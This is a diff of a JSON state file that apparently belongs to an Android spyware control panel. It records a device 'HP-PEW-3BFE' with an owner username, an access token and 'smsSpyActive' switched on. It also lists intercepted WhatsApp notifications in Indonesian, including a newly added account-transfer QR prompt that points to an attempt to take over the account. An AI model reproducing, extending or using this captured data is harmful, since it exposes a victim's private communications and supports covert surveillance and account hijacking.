@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "00613901ddb20be7b9614da5e8ef8e90",
-    "lastSeen": 1776858095177,
+    "lastSeen": 1776858113131,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T07:08:58.851Z",
@@ -20,6 +20,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "Transfer akun Anda",
+        "content": "Ketuk untuk membuka kamera WhatsApp lalu pindai kode QR di telepon Anda lainnya.",
+        "time": "22/04 19:41",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776858113838
+      },
       {
         "appName": "WhatsApp",
         "sender": "Menghapus pesan…",
@@ -4011,14 +4019,6 @@
         "time": "22/04 15:11",
         "pkg": "com.whatsapp",
         "receivedAt": 1776841876914
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "7Sex Message",
-        "content": "‎26 pesan baru",
-        "time": "22/04 15:11",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776841875692
       }
     ],
     "galleryPhotos": [],
